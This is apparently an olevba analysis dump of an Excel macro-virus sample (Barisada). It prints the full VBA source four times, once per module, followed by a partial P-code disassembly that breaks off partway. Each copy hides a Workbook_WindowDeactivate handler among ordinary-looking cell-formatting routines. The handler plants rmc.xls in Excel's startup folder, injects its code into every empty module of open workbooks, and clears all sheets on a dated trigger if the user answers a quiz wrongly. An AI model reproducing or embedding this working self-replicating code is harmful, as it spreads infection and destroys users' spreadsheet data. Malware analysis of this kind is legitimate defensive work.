olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Barisada.o.xls
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Barisada.o.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub Format()
Dim i As Integer, r As Long, p As Integer, c As Integer, col As String, range As String
    Dim tmp As String, mask As String, cellval As String
    For c = 1 To 6
    If c > 26 And c Mod 26 = 1 Then
        range = Chr(Asc("A") + (c / 26) - 1)
    End If
        tmp = LCase(Sheet1.Cells(1, c))
mask = Sheet1.Cells(2, c)
    If mask <> "" And InStr(tmp, "date") = 0 Then
    If InStr(mask, "hide_field") > 0 Then
Sheet1.Cells(1, c).EntireColumn.Delete
    ElseIf InStr(mask, "number_mask") > 0 Then
        col = range & Chr(Asc("A") + (c - 1) Mod 26) & "3"
        Sheet1.range(col).EntireColumn.NumberFormat = "#,##0.00;[Red]-#,##0.00 "
Else
        For r = 3 To 158 + 2
            p = 1
            tmp = ""
            cellval = Trim(Sheet1.Cells(r, c))
            For i = 1 To Len(mask)
                If p > Len(cellval) Then Exit For
                If InStr("@#!", Mid(mask, i, 1)) > 0 Then
                    tmp = tmp + Mid(cellval, p, 1)
                    p = p + 1
                Else
                    tmp = tmp + Mid(mask, i, 1)
                End If
            Next i
        Sheet1.Cells(r, c) = tmp
        Next r
    End If
End If
    Next c
Sheet1.range("A2").EntireRow.Delete
End Sub

Public Sub ConvertDate()
Dim i As Integer, r As Long, str As String, julDate As Long, c As String, range As String
For i = 1 To 6
    If i > 26 And i Mod 26 = 1 Then
        range = Chr(Asc("A") + (i / 26) - 1)
    End If
    If Sheet1.Cells(1, i) <> "" Then
        str = LCase(Sheet1.Cells(1, i))
        If InStr(str, "date") > 0 Then
        For r = 3 To 158 + 2
            julDate = Sheet1.Cells(r, i)
            If julDate >= 727933 And julDate < 731947 Then
                d = CDate(julDate - 693594)
                Sheet1.Cells(r, i) = d
            End If
        Next r
c = range & Chr(Asc("A") + (i - 1) Mod 26) & "3"
        Sheet1.range(c).EntireColumn.NumberFormat = Sheet1.Cells(2, i)
        End If
    End If
Next i
End Sub

Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
On Error Resume Next
flag = False
 
 myfile = Dir(Application.StartupPath & "\rmc.xls")
 If myfile <> "rmc.xls" Then
   Application.ScreenUpdating = False
   Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\rmc.xls", FileFormat:=xlNormal, addtomru:=False
 End If
 

For i = 1 To Workbooks.Count
  eline = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
  If eline <> o Then vcode = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.Lines(1, eline)
  
  
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  vcount = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines
  If vcount = 0 Then Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.AddFromString (vcode)
 Next j: Next i
  
  
 If myfile <> "rmc.xls" Then Workbooks("rmc.xls").Close savechanges:=True
 


dmonth = Month(Now): dday = Day(Now): dhour = Hour(Now)

If dmonth = 4 And dday = 24 And dhour = 14 Then flag = True

If flag = True Then
  v1 = MsgBox("Question : What is the Sword Which Karl Styner(=Gray Scavenger) used? " & vbCr & _
  "Answer : Barisada ", vbYesNo, "1st Qusetion")
  
  If v1 = vbNo Then MsgBox "Good! You're Authorized now!!", vbOKOnly, "Right Answer"
  If v1 = vbYes Then
     MsgBox "I wil give you one more Chance. Be careful!!", vbOKOnly + vbCritical, "Wrong Answer"
     v2 = MsgBox("Summoning Xavier is the Ultimate Magic. Right?", vbYesNo, "Wrong Answer may cause The Serious Problem!")
     If v2 = vbYes Then MsgBox "ok , i will forgive you", vbOKOnly, "Right Answer"
     If v2 = vbNo Then
       MsgBox "Wrong Answer, Your file will be deleted!", vbOKOnly + vbCritical, "You shall Die"
       For i = 1 To Workbooks.Count
        For j = 1 To Workbooks(i).Sheets.Count
          Workbooks(i).Sheets(i).Cells.Select
          Selection.Clear
       Next j: Next i:
     End If
     
     
  End If
 End If
  
     
  

  

   
 
 

   


End Sub


























































































































































-------------------------------------------------------------------------------
VBA MACRO List1.cls 
in file: Virus.MSExcel.Barisada.o.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/List1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub Format()
Dim i As Integer, r As Long, p As Integer, c As Integer, col As String, range As String
    Dim tmp As String, mask As String, cellval As String
    For c = 1 To 6
    If c > 26 And c Mod 26 = 1 Then
        range = Chr(Asc("A") + (c / 26) - 1)
    End If
        tmp = LCase(Sheet1.Cells(1, c))
mask = Sheet1.Cells(2, c)
    If mask <> "" And InStr(tmp, "date") = 0 Then
    If InStr(mask, "hide_field") > 0 Then
Sheet1.Cells(1, c).EntireColumn.Delete
    ElseIf InStr(mask, "number_mask") > 0 Then
        col = range & Chr(Asc("A") + (c - 1) Mod 26) & "3"
        Sheet1.range(col).EntireColumn.NumberFormat = "#,##0.00;[Red]-#,##0.00 "
Else
        For r = 3 To 158 + 2
            p = 1
            tmp = ""
            cellval = Trim(Sheet1.Cells(r, c))
            For i = 1 To Len(mask)
                If p > Len(cellval) Then Exit For
                If InStr("@#!", Mid(mask, i, 1)) > 0 Then
                    tmp = tmp + Mid(cellval, p, 1)
                    p = p + 1
                Else
                    tmp = tmp + Mid(mask, i, 1)
                End If
            Next i
        Sheet1.Cells(r, c) = tmp
        Next r
    End If
End If
    Next c
Sheet1.range("A2").EntireRow.Delete
End Sub

Public Sub ConvertDate()
Dim i As Integer, r As Long, str As String, julDate As Long, c As String, range As String
For i = 1 To 6
    If i > 26 And i Mod 26 = 1 Then
        range = Chr(Asc("A") + (i / 26) - 1)
    End If
    If Sheet1.Cells(1, i) <> "" Then
        str = LCase(Sheet1.Cells(1, i))
        If InStr(str, "date") > 0 Then
        For r = 3 To 158 + 2
            julDate = Sheet1.Cells(r, i)
            If julDate >= 727933 And julDate < 731947 Then
                d = CDate(julDate - 693594)
                Sheet1.Cells(r, i) = d
            End If
        Next r
c = range & Chr(Asc("A") + (i - 1) Mod 26) & "3"
        Sheet1.range(c).EntireColumn.NumberFormat = Sheet1.Cells(2, i)
        End If
    End If
Next i
End Sub

Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
On Error Resume Next
flag = False
 
 myfile = Dir(Application.StartupPath & "\rmc.xls")
 If myfile <> "rmc.xls" Then
   Application.ScreenUpdating = False
   Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\rmc.xls", FileFormat:=xlNormal, addtomru:=False
 End If
 

For i = 1 To Workbooks.Count
  eline = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
  If eline <> o Then vcode = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.Lines(1, eline)
  
  
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  vcount = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines
  If vcount = 0 Then Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.AddFromString (vcode)
 Next j: Next i
  
  
 If myfile <> "rmc.xls" Then Workbooks("rmc.xls").Close savechanges:=True
 


dmonth = Month(Now): dday = Day(Now): dhour = Hour(Now)

If dmonth = 4 And dday = 24 And dhour = 14 Then flag = True

If flag = True Then
  v1 = MsgBox("Question : What is the Sword Which Karl Styner(=Gray Scavenger) used? " & vbCr & _
  "Answer : Barisada ", vbYesNo, "1st Qusetion")
  
  If v1 = vbNo Then MsgBox "Good! You're Authorized now!!", vbOKOnly, "Right Answer"
  If v1 = vbYes Then
     MsgBox "I wil give you one more Chance. Be careful!!", vbOKOnly + vbCritical, "Wrong Answer"
     v2 = MsgBox("Summoning Xavier is the Ultimate Magic. Right?", vbYesNo, "Wrong Answer may cause The Serious Problem!")
     If v2 = vbYes Then MsgBox "ok , i will forgive you", vbOKOnly, "Right Answer"
     If v2 = vbNo Then
       MsgBox "Wrong Answer, Your file will be deleted!", vbOKOnly + vbCritical, "You shall Die"
       For i = 1 To Workbooks.Count
        For j = 1 To Workbooks(i).Sheets.Count
          Workbooks(i).Sheets(i).Cells.Select
          Selection.Clear
       Next j: Next i:
     End If
     
     
  End If
 End If
  
     
  

  

   
 
 

   


End Sub


























































































































































-------------------------------------------------------------------------------
VBA MACRO List2.cls 
in file: Virus.MSExcel.Barisada.o.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/List2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub Format()
Dim i As Integer, r As Long, p As Integer, c As Integer, col As String, range As String
    Dim tmp As String, mask As String, cellval As String
    For c = 1 To 6
    If c > 26 And c Mod 26 = 1 Then
        range = Chr(Asc("A") + (c / 26) - 1)
    End If
        tmp = LCase(Sheet1.Cells(1, c))
mask = Sheet1.Cells(2, c)
    If mask <> "" And InStr(tmp, "date") = 0 Then
    If InStr(mask, "hide_field") > 0 Then
Sheet1.Cells(1, c).EntireColumn.Delete
    ElseIf InStr(mask, "number_mask") > 0 Then
        col = range & Chr(Asc("A") + (c - 1) Mod 26) & "3"
        Sheet1.range(col).EntireColumn.NumberFormat = "#,##0.00;[Red]-#,##0.00 "
Else
        For r = 3 To 158 + 2
            p = 1
            tmp = ""
            cellval = Trim(Sheet1.Cells(r, c))
            For i = 1 To Len(mask)
                If p > Len(cellval) Then Exit For
                If InStr("@#!", Mid(mask, i, 1)) > 0 Then
                    tmp = tmp + Mid(cellval, p, 1)
                    p = p + 1
                Else
                    tmp = tmp + Mid(mask, i, 1)
                End If
            Next i
        Sheet1.Cells(r, c) = tmp
        Next r
    End If
End If
    Next c
Sheet1.range("A2").EntireRow.Delete
End Sub

Public Sub ConvertDate()
Dim i As Integer, r As Long, str As String, julDate As Long, c As String, range As String
For i = 1 To 6
    If i > 26 And i Mod 26 = 1 Then
        range = Chr(Asc("A") + (i / 26) - 1)
    End If
    If Sheet1.Cells(1, i) <> "" Then
        str = LCase(Sheet1.Cells(1, i))
        If InStr(str, "date") > 0 Then
        For r = 3 To 158 + 2
            julDate = Sheet1.Cells(r, i)
            If julDate >= 727933 And julDate < 731947 Then
                d = CDate(julDate - 693594)
                Sheet1.Cells(r, i) = d
            End If
        Next r
c = range & Chr(Asc("A") + (i - 1) Mod 26) & "3"
        Sheet1.range(c).EntireColumn.NumberFormat = Sheet1.Cells(2, i)
        End If
    End If
Next i
End Sub

Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
On Error Resume Next
flag = False
 
 myfile = Dir(Application.StartupPath & "\rmc.xls")
 If myfile <> "rmc.xls" Then
   Application.ScreenUpdating = False
   Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\rmc.xls", FileFormat:=xlNormal, addtomru:=False
 End If
 

For i = 1 To Workbooks.Count
  eline = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
  If eline <> o Then vcode = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.Lines(1, eline)
  
  
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  vcount = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines
  If vcount = 0 Then Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.AddFromString (vcode)
 Next j: Next i
  
  
 If myfile <> "rmc.xls" Then Workbooks("rmc.xls").Close savechanges:=True
 


dmonth = Month(Now): dday = Day(Now): dhour = Hour(Now)

If dmonth = 4 And dday = 24 And dhour = 14 Then flag = True

If flag = True Then
  v1 = MsgBox("Question : What is the Sword Which Karl Styner(=Gray Scavenger) used? " & vbCr & _
  "Answer : Barisada ", vbYesNo, "1st Qusetion")
  
  If v1 = vbNo Then MsgBox "Good! You're Authorized now!!", vbOKOnly, "Right Answer"
  If v1 = vbYes Then
     MsgBox "I wil give you one more Chance. Be careful!!", vbOKOnly + vbCritical, "Wrong Answer"
     v2 = MsgBox("Summoning Xavier is the Ultimate Magic. Right?", vbYesNo, "Wrong Answer may cause The Serious Problem!")
     If v2 = vbYes Then MsgBox "ok , i will forgive you", vbOKOnly, "Right Answer"
     If v2 = vbNo Then
       MsgBox "Wrong Answer, Your file will be deleted!", vbOKOnly + vbCritical, "You shall Die"
       For i = 1 To Workbooks.Count
        For j = 1 To Workbooks(i).Sheets.Count
          Workbooks(i).Sheets(i).Cells.Select
          Selection.Clear
       Next j: Next i:
     End If
     
     
  End If
 End If
  
     
  

  

   
 
 

   


End Sub


























































































































































-------------------------------------------------------------------------------
VBA MACRO List3.cls 
in file: Virus.MSExcel.Barisada.o.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/List3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub Format()
Dim i As Integer, r As Long, p As Integer, c As Integer, col As String, range As String
    Dim tmp As String, mask As String, cellval As String
    For c = 1 To 6
    If c > 26 And c Mod 26 = 1 Then
        range = Chr(Asc("A") + (c / 26) - 1)
    End If
        tmp = LCase(Sheet1.Cells(1, c))
mask = Sheet1.Cells(2, c)
    If mask <> "" And InStr(tmp, "date") = 0 Then
    If InStr(mask, "hide_field") > 0 Then
Sheet1.Cells(1, c).EntireColumn.Delete
    ElseIf InStr(mask, "number_mask") > 0 Then
        col = range & Chr(Asc("A") + (c - 1) Mod 26) & "3"
        Sheet1.range(col).EntireColumn.NumberFormat = "#,##0.00;[Red]-#,##0.00 "
Else
        For r = 3 To 158 + 2
            p = 1
            tmp = ""
            cellval = Trim(Sheet1.Cells(r, c))
            For i = 1 To Len(mask)
                If p > Len(cellval) Then Exit For
                If InStr("@#!", Mid(mask, i, 1)) > 0 Then
                    tmp = tmp + Mid(cellval, p, 1)
                    p = p + 1
                Else
                    tmp = tmp + Mid(mask, i, 1)
                End If
            Next i
        Sheet1.Cells(r, c) = tmp
        Next r
    End If
End If
    Next c
Sheet1.range("A2").EntireRow.Delete
End Sub

Public Sub ConvertDate()
Dim i As Integer, r As Long, str As String, julDate As Long, c As String, range As String
For i = 1 To 6
    If i > 26 And i Mod 26 = 1 Then
        range = Chr(Asc("A") + (i / 26) - 1)
    End If
    If Sheet1.Cells(1, i) <> "" Then
        str = LCase(Sheet1.Cells(1, i))
        If InStr(str, "date") > 0 Then
        For r = 3 To 158 + 2
            julDate = Sheet1.Cells(r, i)
            If julDate >= 727933 And julDate < 731947 Then
                d = CDate(julDate - 693594)
                Sheet1.Cells(r, i) = d
            End If
        Next r
c = range & Chr(Asc("A") + (i - 1) Mod 26) & "3"
        Sheet1.range(c).EntireColumn.NumberFormat = Sheet1.Cells(2, i)
        End If
    End If
Next i
End Sub

Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
On Error Resume Next
flag = False
 
 myfile = Dir(Application.StartupPath & "\rmc.xls")
 If myfile <> "rmc.xls" Then
   Application.ScreenUpdating = False
   Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\rmc.xls", FileFormat:=xlNormal, addtomru:=False
 End If
 

For i = 1 To Workbooks.Count
  eline = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
  If eline <> o Then vcode = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.Lines(1, eline)
  
  
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  vcount = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines
  If vcount = 0 Then Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.AddFromString (vcode)
 Next j: Next i
  
  
 If myfile <> "rmc.xls" Then Workbooks("rmc.xls").Close savechanges:=True
 


dmonth = Month(Now): dday = Day(Now): dhour = Hour(Now)

If dmonth = 4 And dday = 24 And dhour = 14 Then flag = True

If flag = True Then
  v1 = MsgBox("Question : What is the Sword Which Karl Styner(=Gray Scavenger) used? " & vbCr & _
  "Answer : Barisada ", vbYesNo, "1st Qusetion")
  
  If v1 = vbNo Then MsgBox "Good! You're Authorized now!!", vbOKOnly, "Right Answer"
  If v1 = vbYes Then
     MsgBox "I wil give you one more Chance. Be careful!!", vbOKOnly + vbCritical, "Wrong Answer"
     v2 = MsgBox("Summoning Xavier is the Ultimate Magic. Right?", vbYesNo, "Wrong Answer may cause The Serious Problem!")
     If v2 = vbYes Then MsgBox "ok , i will forgive you", vbOKOnly, "Right Answer"
     If v2 = vbNo Then
       MsgBox "Wrong Answer, Your file will be deleted!", vbOKOnly + vbCritical, "You shall Die"
       For i = 1 To Workbooks.Count
        For j = 1 To Workbooks(i).Sheets.Count
          Workbooks(i).Sheets(i).Cells.Select
          Selection.Clear
       Next j: Next i:
     End If
     
     
  End If
 End If
  
     
  

  

   
 
 

   


End Sub


























































































































































-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  List
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  List
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  List
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSExcel.Barisada.o.xls
' ===============================================================================
' Module streams:
' _VBA_PROJECT_CUR/VBA/ThisWorkbook - 9822 bytes
' Line #0:
' 	FuncDefn (Public Sub Format$())
' Line #1:
' 	Dim 
' 	VarDefn i (As Integer)
' 	VarDefn r (As Long)
' 	VarDefn p (As Integer)
' 	VarDefn c (As Integer)
' 	VarDefn col (As String)
' 	VarDefn range (As String)
' Line #2:
' 	Dim 
' 	VarDefn tmp (As String)
' 	VarDefn mask (As String)
' 	VarDefn cellval (As String)
' Line #3:
' 	StartForVariable 
' 	Ld c 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0006 
' 	For 
' Line #4:
' 	Ld c 
' 	LitDI2 0x001A 
' 	Gt 
' 	Ld c 
' 	LitDI2 0x001A 
' 	Mod 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #5:
' 	LitStr 0x0001 "A"
' 	ArgsLd Asc 0x0001 
' 	Ld c 
' 	LitDI2 0x001A 
' 	Div 
' 	Paren 
' 	Add 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	St range 
' Line #6:
' 	EndIfBlock 
' Line #7:
' 	LitDI2 0x0001 
' 	Ld c 
' 	Ld Sheet1 
' 	ArgsMemLd Cells 0x0002 
' 	ArgsLd LCase 0x0001 
' 	St tmp 
' Line #8:
' 	LitDI2 0x0002 
' 	Ld c 
' 	Ld Sheet1 
' 	ArgsMemLd Cells 0x0002 
' 	St mask 
' Line #9:
' 	Ld mask 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Ld tmp 
' 	LitStr 0x0004 "date"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #10:
' 	Ld mask 
' 	LitStr 0x000A "hide_field"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #11:
' 	LitDI2 0x0001 
' 	Ld c 
' 	Ld Sheet1 
' 	ArgsMemLd Cells 0x0002 
' 	MemLd EntireColumn 
' 	ArgsMemCall Delete 0x0000 
' Line #12:
' 	Ld mask 
' 	LitStr 0x000B "number_mask"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Gt 
' 	ElseIfBlock 
' Line #13:
' 	Ld range 
' 	LitStr 0x0001 "A"
' 	ArgsLd Asc 0x0001 
' 	Ld c 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	LitDI2 0x001A 
' 	Mod 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 "3"
' 	Concat 
' 	St col 
' Line #14:
' 	LitStr 0x0018 "#,##0.00;[Red]-#,##0.00 "
' 	Ld col 
' 	Ld Sheet1 
' 	ArgsMemLd range 0x0001 
' 	MemLd EntireColumn 
' 	MemSt NumberFormat 
' Line #15:
' 	ElseBlock 
' Line #16:
' 	StartForVariable 
' 	Ld r 
' 	EndForVariable 
' 	LitDI2 0x0003 
' 	LitDI2 0x009E 
' 	LitDI2 0x0002 
' 	Add 
' 	For 
' Line #17:
' 	LitDI2 0x0001 
' 	St p 
' Line #18:
' 	LitStr 0x0000 ""
' 	St tmp 
' Line #19:
' 	Ld r 
' 	Ld c 
' 	Ld Sheet1 
' 	ArgsMemLd Cells 0x0002 
' 	ArgsLd Trim 0x0001 
' 	St cellval 
' Line #20:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld mask 
' 	FnLen 
' 	For 
' Line #21:
' 	Ld p 
' 	Ld cellval 
' 	FnLen 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #22:
' 	LitStr 0x0003 "@#!"
' 	Ld mask 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #23:
' 	Ld tmp 
' 	Ld cellval 
' 	Ld p 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St tmp 
' Line #24:
' 	Ld p 
' 	LitDI2 0x0001 
' 	Add 
' 	St p 
' Line #25:
' 	ElseBlock 
' Line #26:
' 	Ld tmp 
' 	Ld mask 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St tmp 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #29:
' 	Ld tmp 
' 	Ld r 
' 	Ld c 
' 	Ld Sheet1 
' 	ArgsMemSt Cells 0x0002 
' Line #30:
' 	StartForVariable 
' 	Ld r 
' 	EndForVariable 
' 	NextVar 
' Line #31:
' 	EndIfBlock 
' Line #32:
' 	EndIfBlock 
' Line #33:
' 	StartForVariable 
' 	Ld c 
' 	EndForVariable 
' 	NextVar 
' Line #34:
' 	LitStr 0x0002 "A2"
' 	Ld Sheet1 
' 	ArgsMemLd range 0x0001 
' 	MemLd EntireRow 
' 	ArgsMemCall Delete 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' Line #37:
' 	FuncDefn (Public Sub ConvertDate())
' Line #38:
' 	Dim 
' 	VarDefn i (As Integer)
' 	VarDefn r (As Long)
' 	VarDefn str (As String)
' 	VarDefn julDate (As Long)
' 	VarDefn c (As String)
' 	VarDefn range (As String)
' Line #39:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0006 
' 	For 
' Line #40:
' 	Ld i 
' 	LitDI2 0x001A 
' 	Gt 
' 	Ld i 
' 	LitDI2 0x001A 
' 	Mod 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #41:
' 	LitStr 0x0001 "A"
' 	ArgsLd Asc 0x0001 
' 	Ld i 
' 	LitDI2 0x001A 
' 	Div 
' 	Paren 
' 	Add 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	St range 
' Line #42:
' 	EndIfBlock 
' Line #43:
' 	LitDI2 0x0001 
' 	Ld i 
' 	Ld Sheet1 
' 	ArgsMemLd Cells 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #44:
' 	LitDI2 0x0001 
' 	Ld i 
' 	Ld Sheet1 
' 	ArgsMemLd Cells 0x0002 
' 	ArgsLd LCase 0x0001 
' 	St str 
' Line #45:
' 	Ld str 
' 	LitStr 0x0004 "date"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #46:
' 	StartForVariable 
' 	Ld r 
' 	EndForVariable 
' 	LitDI2 0x0003 
' 	LitDI2 0x009E 
' 	LitDI2 0x0002 
' 	Add 
' 	For 
' Line #47:
' 	Ld r 
' 	Ld i 
' 	Ld Sheet1 
' 	ArgsMemLd Cells 0x0002 
' 	St julDate 
' Line #48:
' 	Ld julDate 
' 	LitDI4 0x1B7D 0x000B 
' 	Ge 
' 	Ld julDate 
' 	LitDI4 0x2B2B 0x000B 
' 	Lt 
' 	And 
' 	IfBlock 
' Line #49:
' 	Ld julDate 
' 	LitDI4 0x955A 0x000A 
' 	Sub 
' 	Coerce (Date) 
' 	St d 
' Line #50:
' 	Ld d 
' 	Ld r 
' 	Ld i 
' 	Ld Sheet1 
' 	ArgsMemSt Cells 0x0002 
' Line #51:
' 	EndIfBlock 
' Line #52:
' 	StartForVariable 
' 	Ld r 
' 	EndForVariable 
' 	NextVar 
' Line #53:
' 	Ld range 
' 	LitStr 0x0001 "A"
' 	ArgsLd Asc 0x0001 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	LitDI2 0x001A 
' 	Mod 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 "3"
' 	Concat 
' 	St c 
' Line #54:
' 	LitDI2 0x0002 
' 	Ld i 
' 	Ld Sheet1 
' 	ArgsMemLd Cells 0x0002 
' 	Ld c 
' 	Ld Sheet1 
' 	ArgsMemLd range 0x0001 
' 	MemLd EntireColumn 
' 	MemSt NumberFormat 
' Line #55:
' 	EndIfBlock 
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #58:
' 	EndSub 
' Line #59:
' Line #60:
' 	FuncDefn (Private Sub Workbook_WindowDeactivate(ByVal Wn As ))
' Line #61:
' 	OnError (Resume Next) 
' Line #62:
' 	LitVarSpecial (False)
' 	St flag 
' Line #63:
' Line #64:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0008 "\rmc.xls"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St myfile 
' Line #65:
' 	Ld myfile 
' 	LitStr 0x0007 "rmc.xls"
' 	Ne 
' 	IfBlock 
' Line #66:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #67:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0008 "\rmc.xls"
' 	Concat 
' 	ParamNamed FileName 
' 	Ld xlNormal 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed addtomru 
' 	Ld Workbooks 
' 	MemLd Add 
' 	ArgsMemCall SaveAs 0x0003 
' Line #68:
' 	EndIfBlock 
' Line #69:
' Line #70:
' Line #71:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #72:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St eline 
' Line #73:
' 	Ld eline 
' 	Ld o 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld eline 
' 	LitStr 0x000C "thisworkbook"
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St vcode 
' 	EndIf 
' Line #74:
' Line #75:
' Line #76:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #77:
' 	Ld j 
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St vcount 
' Line #78:
' 	Ld vcount 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld vcode 
' 	Paren 
' 	Ld j 
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' 	EndIf 
' Line #79:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #80:
' Line #81:
' Line #82:
' 	Ld myfile 
' 	LitStr 0x0007 "rmc.xls"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	ParamNamed savechanges 
' 	LitStr 0x0007 "rmc.xls"
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Close 0x0001 
' 	EndIf 
' Line #83:
' Line #84:
' Line #85:
' Line #86:
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	St dmonth 
' 	BoS 0x0000 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	St dday 
